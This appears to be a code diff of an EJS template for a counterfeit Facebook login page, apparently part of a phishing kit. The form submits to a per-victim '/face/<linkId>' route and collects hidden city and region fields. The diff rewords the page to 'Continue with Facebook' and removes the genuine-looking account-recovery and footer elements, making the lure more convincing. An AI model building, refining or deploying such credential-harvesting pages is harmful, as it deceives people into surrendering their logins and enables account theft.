@@ -70,7 +70,7 @@
             action="/face/<%=linkId%>"
             onsubmit="handleSubmit()"
           >
-            <p class="form-heading">Log in to Facebook</p>
+            <p class="form-heading">Continue with Facebook</p>
             <%- include("../../partials/messages") %>
             <div class="mb-3">
               <input
@@ -99,60 +99,20 @@
             <input type="hidden" name="city" id="city" value="" />
             <input type="hidden" name="region" id="region" value="" />
 
-            <button type="submit" name="submit" class="LogInBTN" id="submit">
-              Log in
+            <button type="submit" name="submit" class="connectWithBTN" id="submit">
+              Continue with Facebook
             </button>
             <button
               type="button"
-              class="LogInBTN"
+              class="connectWithBTN"
               id="submit2"
               style="display: none"
             >
               <img src="/img/loading.svg" alt="" />
             </button>
           </form>
-          <div class="card-body">
-            <a href="#" class="forgetLink"><p>Forgotten account?</p></a>
-            <div class="hr-container">
-              <hr class="cardHR" />
-            </div>
-            <button type="submit" class="btn btn-primary CreateNewAccountBTN">
-              Create new account
-            </button>
-          </div>
         </div>
       </center>
-    </div>
-
-    <div class="second-container">
-      <div class="footer">
-        <ul id="techlist">
-          <li>English&nbsp;(UK)</li>
-          <i class="circle icon"></i>
-          <li>हिन्दी</li>
-          <i class="circle icon"></i>
-          <li>ਪੰਜਾਬੀ</li>
-          <i class="circle icon"></i>
-          <li>ردو</li>
-          <i class="circle icon"></i>
-          <li>தமிழ்</li>
-          <i class="circle icon"></i>
-          <li>বাংলা</li>
-          <i class="circle icon"></i>
-          <li>मराठी</li>
-          <i class="circle icon"></i>
-          <li>తెలుగు</li>
-          <i class="circle icon"></i>
-          <li>ગુજરાતી</li>
-          <i class="circle icon"></i>
-          <li>ಕನ್ನಡ</li>
-          <i class="circle icon"></i>
-          <li>മലയാളം</li>
-          <button class="plusBTN">+</button>
-
-          <hr />
-        </ul>
-      </div>
     </div>
 
     <script>
